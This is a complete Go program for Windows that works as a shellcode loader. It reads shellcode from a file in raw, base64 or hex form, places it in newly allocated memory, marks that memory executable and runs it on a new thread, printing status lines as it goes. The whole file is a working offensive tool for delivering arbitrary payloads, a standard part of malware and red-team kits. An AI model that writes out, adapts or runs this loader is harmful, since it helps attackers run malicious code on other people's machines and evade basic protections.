package main

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"os"
	"strings"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT  = 0x1000
	MEM_RESERVE = 0x2000

	PAGE_READWRITE  = 0x04
	PAGE_EXECUTE_READ = 0x20

	INFINITE = 0xFFFFFFFF
)

var (
	kernel32      = syscall.NewLazyDLL("kernel32.dll")
	ntdll         = syscall.NewLazyDLL("ntdll.dll")
	virtualAlloc  = kernel32.NewProc("VirtualAlloc")
	virtualProtect = kernel32.NewProc("VirtualProtect")
	createThread  = kernel32.NewProc("CreateThread")
	waitForSingle = kernel32.NewProc("WaitForSingleObject")
	rtlMoveMemory = ntdll.NewProc("RtlMoveMemory")
)

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: loader.exe <shellcode_file> [format]")
		fmt.Println()
		fmt.Println("Formats:")
		fmt.Println("  raw     - raw bytes (default)")
		fmt.Println("  base64  - base64 encoded")
		fmt.Println("  hex     - hex encoded")
		os.Exit(1)
	}

	filePath := os.Args[1]
	format := "raw"
	if len(os.Args) >= 3 {
		format = strings.ToLower(os.Args[2])
	}

	data, err := os.ReadFile(filePath)
	if err != nil {
		fmt.Printf("[-] Failed to read file: %s\n", err)
		os.Exit(1)
	}

	if len(data) == 0 {
		fmt.Println("[-] Shellcode file is empty")
		os.Exit(1)
	}

	var shellcode []byte
	switch format {
	case "raw":
		shellcode = data
	case "base64":
		shellcode, err = base64.StdEncoding.DecodeString(strings.TrimSpace(string(data)))
		if err != nil {
			fmt.Printf("[-] Base64 decode failed: %s\n", err)
			os.Exit(1)
		}
	case "hex":
		cleaned := strings.ReplaceAll(strings.TrimSpace(string(data)), "\n", "")
		cleaned = strings.ReplaceAll(cleaned, " ", "")
		shellcode, err = hex.DecodeString(cleaned)
		if err != nil {
			fmt.Printf("[-] Hex decode failed: %s\n", err)
			os.Exit(1)
		}
	default:
		fmt.Printf("[-] Unknown format: %s (use raw, base64, or hex)\n", format)
		os.Exit(1)
	}

	fmt.Printf("[+] Shellcode size: %d bytes\n", len(shellcode))
	fmt.Println("[+] Allocating memory...")

	addr, _, err := virtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if addr == 0 {
		fmt.Printf("[-] VirtualAlloc failed: %s\n", err)
		os.Exit(1)
	}
	fmt.Printf("[+] Memory allocated at: 0x%x\n", addr)

	fmt.Println("[+] Copying shellcode...")
	rtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	fmt.Println("[+] Changing memory protection to RX...")
	var oldProtect uintptr
	ret, _, err := virtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if ret == 0 {
		fmt.Printf("[-] VirtualProtect failed: %s\n", err)
		os.Exit(1)
	}

	fmt.Println("[+] Creating thread...")
	thread, _, err := createThread.Call(0, 0, addr, 0, 0, 0)
	if thread == 0 {
		fmt.Printf("[-] CreateThread failed: %s\n", err)
		os.Exit(1)
	}
	fmt.Printf("[+] Thread created: 0x%x\n", thread)

	fmt.Println("[+] Waiting for shellcode execution...")
	waitForSingle.Call(thread, INFINITE)
	fmt.Println("[+] Done.")
}
